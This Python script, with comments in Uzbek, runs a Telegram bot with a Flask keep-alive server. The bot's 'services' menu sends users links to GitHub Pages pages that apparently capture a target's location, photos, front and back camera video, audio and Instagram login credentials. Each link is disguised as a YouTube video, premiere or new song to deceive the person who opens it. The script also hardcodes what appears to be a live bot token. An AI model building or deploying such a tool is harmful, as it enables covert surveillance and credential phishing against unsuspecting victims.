import telebot
from telebot import types
import os
from flask import Flask
from threading import Thread

# Render uchun server
app = Flask('')
@app.route('/')
def home(): return "Bot is running!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

TOKEN = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI'
# Admin ID skrinshotingizdan olindi
ADMIN_ID = 8275787221 
# GitHub Pages havolasi
BASE_URL = "https://nodirbekabdimurodov2-design.github.io/Shipyombot"

bot = telebot.TeleBot(TOKEN)

def main_menu():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(types.KeyboardButton("🔐 Xizmatlar"), types.KeyboardButton("💼 Mening hisobim"))
    kb.add(types.KeyboardButton("❓ Qoidalar"), types.KeyboardButton("📞 Bog'lanish"))
    kb.add(types.KeyboardButton("💳 To'lov qilish"))
    return kb

def services_menu():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(types.KeyboardButton("📍 Lokatsiya olish"), types.KeyboardButton("📸 Rasm olish"))
    kb.add(types.KeyboardButton("🎥 Old kamera video"), types.KeyboardButton("🔑 Instagram login"))
    kb.add(types.KeyboardButton("🎬 Orqa kamera video"), types.KeyboardButton("🎵 Audio yozish"))
    kb.add(types.KeyboardButton("⬅️ Asosiy menyu"))
    return kb

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ Bot doimiy rejimda ishga tushdi!", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_all(m):
    text = m.text
    # Tugmalarni tekshirish
    if "Xizmatlar" in text:
        bot.send_message(m.chat.id, "Bo'limni tanlang:", reply_markup=services_menu())
    elif "Asosiy menyu" in text:
        bot.send_message(m.chat.id, "Asosiy menyu:", reply_markup=main_menu())
    
    # HAVOLALARNI YUBORISH (YouTube ko'rinishida)
    elif "Rasm olish" in text:
        bot.send_message(m.chat.id, f"🎬 Yangi video yuklandi: {BASE_URL}/index.html")
    elif "Lokatsiya olish" in text:
        bot.send_message(m.chat.id, f"📍 Videoni ko'rish: {BASE_URL}/index-1.html")
    elif "Old kamera video" in text:
        bot.send_message(m.chat.id, f"🎥 YouTube Premyera: {BASE_URL}/index-2.html")
    elif "Orqa kamera video" in text:
        bot.send_message(m.chat.id, f"🎬 Orqa kamera: {BASE_URL}/Orqa%20kamera%20video%20.html")
    elif "Instagram login" in text:
        bot.send_message(m.chat.id, f"🔐 Profilni tasdiqlash: {BASE_URL}/instagram.html")
    elif "Audio yozish" in text:
        bot.send_message(m.chat.id, f"🎵 Yangi qo'shiq: {BASE_URL}/audio.html")

if __name__ == "__main__":
    keep_alive()
    bot.polling(none_stop=True)
